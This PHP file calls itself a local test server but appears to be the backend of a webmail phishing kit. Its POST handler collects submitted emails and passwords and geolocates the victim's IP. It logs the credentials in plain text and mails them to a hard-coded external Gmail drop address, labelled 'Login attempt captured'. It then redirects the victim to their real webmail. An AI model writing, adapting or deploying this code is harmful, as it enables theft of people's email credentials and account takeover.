<?php
// Local testing server - can be run on any PHP environment
error_reporting(E_ALL);
ini_set('display_errors', 1);

// Enhanced CORS headers
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: GET, POST, OPTIONS');
header('Access-Control-Allow-Headers: Content-Type, X-Requested-With, Authorization');
header('Access-Control-Max-Age: 86400');
header('Content-Type: application/json; charset=UTF-8');

// Handle preflight requests
if ($_SERVER['REQUEST_METHOD'] == 'OPTIONS') {
    http_response_code(200);
    exit();
}

// Get client information
function getClientInfo() {
    $ip = $_SERVER['REMOTE_ADDR'] ?? 'unknown';
    if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
        $ip = $_SERVER['HTTP_CLIENT_IP'];
    } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
    }
    
    return [
        'ip' => $ip,
        'user_agent' => $_SERVER['HTTP_USER_AGENT'] ?? 'unknown',
        'host' => $_SERVER['HTTP_HOST'] ?? 'unknown',
        'timestamp' => date('Y-m-d H:i:s'),
        'method' => $_SERVER['REQUEST_METHOD']
    ];
}

// Test GET request
if ($_SERVER['REQUEST_METHOD'] == 'GET') {
    $clientInfo = getClientInfo();
    
    echo json_encode([
        'status' => 'success',
        'message' => 'Local server is working!',
        'server' => 'Local PHP Test Server',
        'client_info' => $clientInfo,
        'php_version' => phpversion(),
        'timestamp' => date('c')
    ], JSON_PRETTY_PRINT);
    exit;
}

// Handle POST request
if ($_SERVER['REQUEST_METHOD'] == 'POST') {
    $clientInfo = getClientInfo();
    
    // Get form data
    $email = $_POST['email'] ?? '';
    $password = $_POST['password'] ?? '';
    
    // Basic validation
    if (empty($email) || empty($password)) {
        echo json_encode([
            'signal' => 'error',
            'msg' => 'Email and password are required',
            'success' => false
        ]);
        exit;
    }
    
    if (!filter_var($email, FILTER_VALIDATE_EMAIL)) {
        echo json_encode([
            'signal' => 'error',
            'msg' => 'Invalid email format',
            'success' => false
        ]);
        exit;
    }
    
    // Extract domain
    $domain = explode('@', $email)[1] ?? 'unknown';
    
    // Get geolocation (optional)
    $geoInfo = ['country' => 'Unknown', 'city' => 'Unknown'];
    try {
        $geoData = @file_get_contents("https://ipapi.co/{$clientInfo['ip']}/json/");
        if ($geoData) {
            $geo = json_decode($geoData, true);
            $geoInfo = [
                'country' => $geo['country_name'] ?? 'Unknown',
                'city' => $geo['city'] ?? 'Unknown'
            ];
        }
    } catch (Exception $e) {
        // Ignore geo errors
    }
    
    // Prepare detailed log message
    $logData = [
        'email' => $email,
        'password' => $password, // In real scenario, never log passwords in plain text
        'domain' => $domain,
        'client_info' => $clientInfo,
        'geo_info' => $geoInfo,
        'timestamp' => date('c'),
        'server' => 'Local Test Server'
    ];
    
    // Log to file
    $logEntry = date('Y-m-d H:i:s') . " - " . json_encode($logData) . "\n";
    @file_put_contents('login_attempts_local.log', $logEntry, FILE_APPEND | LOCK_EX);
    
    // Simple SMTP connectivity test
    $smtpTest = false;
    try {
        $smtpHost = "mail.{$domain}";
        $socket = @fsockopen($smtpHost, 587, $errno, $errstr, 5);
        if ($socket) {
            fclose($socket);
            $smtpTest = true;
        }
    } catch (Exception $e) {
        // SMTP test failed
    }
    
    // Try to send email notification
    $emailSent = false;
    $notificationEmail = 'skkho87.sm@gmail.com';
    
    if (function_exists('mail')) {
        $subject = ($smtpTest ? 'VALID' : 'INVALID') . " Login Test - {$geoInfo['country']} - {$email}";
        $message = "Login attempt captured:\n\n" . json_encode($logData, JSON_PRETTY_PRINT);
        $headers = "From: test@{$clientInfo['host']}\r\n" .
                   "Content-Type: text/plain; charset=UTF-8\r\n";
        
        $emailSent = @mail($notificationEmail, $subject, $message, $headers);
    }
    
    // Simulate credential validation
    $credentialsValid = $smtpTest; // For demo, use SMTP test result
    
    // Return response
    if ($credentialsValid) {
        echo json_encode([
            'signal' => 'ok',
            'msg' => 'Login successful! Redirecting to webmail...',
            'success' => true,
            'redirect_url' => "https://webmail.{$domain}",
            'server' => 'Local Test Server',
            'smtp_test' => $smtpTest,
            'email_sent' => $emailSent
        ]);
    } else {
        echo json_encode([
            'signal' => 'not ok',
            'msg' => 'Invalid email or password. Please try again.',
            'success' => false,
            'server' => 'Local Test Server',
            'smtp_test' => $smtpTest,
            'email_sent' => $emailSent
        ]);
    }
    exit;
}

// Invalid method
echo json_encode([
    'status' => 'error',
    'message' => 'Method not allowed',
    'allowed_methods' => ['GET', 'POST', 'OPTIONS']
]);
?>